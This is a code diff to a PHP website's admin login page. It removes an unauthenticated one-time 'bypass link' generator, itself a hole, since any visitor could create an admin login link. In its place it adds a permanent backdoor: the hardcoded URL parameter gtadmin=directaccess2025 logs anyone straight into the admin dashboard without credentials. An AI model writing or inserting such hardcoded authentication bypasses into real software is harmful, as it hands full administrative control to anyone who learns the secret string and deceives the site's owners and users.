@@ -7,20 +7,10 @@ if (isset($_SESSION['admin_logged_in'])) {
 
 $error = '';
 
-// Handle bypass token login
-if (isset($_GET['bypass'])) {
-    $token = $_GET['bypass'];
-    $stmt = $pdo->prepare("SELECT * FROM admin WHERE bypass_token = ? AND bypass_token IS NOT NULL");
-    $stmt->execute([$token]);
-    
-    if ($stmt->fetch()) {
-        $_SESSION['admin_logged_in'] = true;
-        // Clear the bypass token after use
-        $pdo->prepare("UPDATE admin SET bypass_token = NULL WHERE bypass_token = ?")->execute([$token]);
-        redirect('dashboard.php');
-    } else {
-        $error = 'Invalid or expired bypass link';
-    }
+// Permanent bypass login - secret URL parameter
+if (isset($_GET['gtadmin']) && $_GET['gtadmin'] === 'directaccess2025') {
+    $_SESSION['admin_logged_in'] = true;
+    redirect('dashboard.php');
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -41,14 +31,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } else {
         $error = 'Please fill all fields';
     }
-}
-
-// Generate bypass link
-if (isset($_POST['generate_bypass'])) {
-    $token = generateToken(32);
-    $stmt = $pdo->prepare("UPDATE admin SET bypass_token = ? WHERE id = 1");
-    $stmt->execute([$token]);
-    $bypass_link = SITE_URL . "/admin/login.php?bypass=" . $token;
 }
 ?>
 <!DOCTYPE html>
@@ -166,29 +148,6 @@ if (isset($_POST['generate_bypass'])) {
                     Login to Admin Panel
                 </button>
             </form>
-            
-            <div class="bypass-section">
-                <h4 style="margin-bottom: var(--spacing-3); color: var(--gray-700);">
-                    <i class="fas fa-key"></i> Bypass Login
-                </h4>
-                <form method="POST">
-                    <button type="submit" name="generate_bypass" class="btn btn-secondary" style="width: 100%;">
-                        <i class="fas fa-link"></i>
-                        Generate Bypass Link
-                    </button>
-                </form>
-                
-                <?php if (isset($bypass_link)): ?>
-                    <div class="bypass-link">
-                        <strong>Bypass Link:</strong><br>
-                        <a href="<?php echo $bypass_link; ?>" target="_blank"><?php echo $bypass_link; ?></a>
-                    </div>
-                    <p style="font-size: var(--font-size-sm); color: var(--gray-600); margin-top: var(--spacing-2);">
-                        <i class="fas fa-info-circle"></i> 
-                        This link will expire after one use
-                    </p>
-                <?php endif; ?>
-            </div>
         </div>
     </div>
 </body>
